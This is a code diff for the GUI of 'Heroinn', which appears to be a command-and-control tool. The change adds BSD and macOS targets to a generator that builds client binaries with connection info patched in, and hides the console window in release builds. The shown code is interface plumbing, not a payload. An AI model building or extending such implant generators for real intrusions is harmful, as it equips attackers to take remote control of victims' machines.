@@ -1,5 +1,5 @@
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 use controller::*;
-//use dlg::file::FileDlg;
 use eframe::egui::{self};
 use egui_extras::{Size, StripBuilder , TableBuilder};
 use heroinn_util::{*, ftp::method::transfer_speed, gen::replace_connection_info_to_new_file};
@@ -17,7 +17,9 @@ enum SwitchDock {
 #[derive(PartialEq)]
 enum HeroinnPlatform{
     LinuxX64,
-    WindowsX64
+    WindowsX64,
+    BSDX64,
+    DARWINX64
 }
 
 impl std::fmt::Debug for HeroinnPlatform{
@@ -25,6 +27,8 @@ impl std::fmt::Debug for HeroinnPlatform{
         match self {
             Self::LinuxX64 => write!(f, "Linux_x86_64"),
             Self::WindowsX64 => write!(f, "Windows_x86_64"),
+            Self::BSDX64 => write!(f, "BSD_x86_64"),
+            Self::DARWINX64 => write!(f, "OSX_x86_64"),
         }
     }
 }
@@ -43,9 +47,12 @@ fn doc_link_label<'a>(title: &'a str, search_term: &'a str) -> impl egui::Widget
 }
 
 fn main() {
-    simple_logger::SimpleLogger::new().with_threads(true).with_utc_timestamps().with_colors(true).init().unwrap();
-	::log::set_max_level(log::LevelFilter::Debug);
-    
+
+    #[cfg(debug_assertions)]
+    {
+        simple_logger::SimpleLogger::new().with_threads(true).with_utc_timestamps().with_colors(true).init().unwrap();
+        ::log::set_max_level(log::LevelFilter::Debug);
+    }
     let mut options = eframe::NativeOptions::default();
     options.initial_window_size = Some(egui::Vec2::new(1375.0,610.0));
     eframe::run_native(
@@ -247,6 +254,8 @@ impl HeroinnApp {
                                 .show_ui(ui, |ui| {
                                     ui.selectable_value(&mut self.combox_generator_platform, HeroinnPlatform::WindowsX64, format!("{:?}" , HeroinnPlatform::WindowsX64));
                                     ui.selectable_value(&mut self.combox_generator_platform, HeroinnPlatform::LinuxX64, format!("{:?}" , HeroinnPlatform::LinuxX64));
+                                    ui.selectable_value(&mut self.combox_generator_platform, HeroinnPlatform::BSDX64, format!("{:?}" , HeroinnPlatform::BSDX64));
+                                    ui.selectable_value(&mut self.combox_generator_platform, HeroinnPlatform::DARWINX64, format!("{:?}" , HeroinnPlatform::DARWINX64));
                                 });
                                 ui.end_row();
 
@@ -267,16 +276,20 @@ impl HeroinnApp {
                                     if ui.button("Generate").clicked(){
                                         let path = std::env::current_dir().unwrap();
 
-                                        let res = rfd::FileDialog::new()
-                                            .add_filter("bin", &["*"])
+                                        let res = match rfd::FileDialog::new()
                                             .set_directory(&path)
-                                            .save_file().unwrap();
+                                            .save_file(){
+                                                Some(p) => p,
+                                                None => return,
+                                            };
                                         
                                         let new_path = res.to_str().unwrap().to_string();
 
                                         let slave_file_path = match self.combox_generator_platform{
-                                            HeroinnPlatform::LinuxX64 => path.join("heroinn_client").to_str().unwrap().to_string(),
+                                            HeroinnPlatform::LinuxX64 => path.join("heroinn_client_linux").to_str().unwrap().to_string(),
                                             HeroinnPlatform::WindowsX64 => path.join("heroinn_client.exe").to_str().unwrap().to_string(),
+                                            HeroinnPlatform::BSDX64 => path.join("heroinn_client_bsd").to_str().unwrap().to_string(),
+                                            HeroinnPlatform::DARWINX64 => path.join("heroinn_client_darwin").to_str().unwrap().to_string(),
                                         };
 
                                         match replace_connection_info_to_new_file(
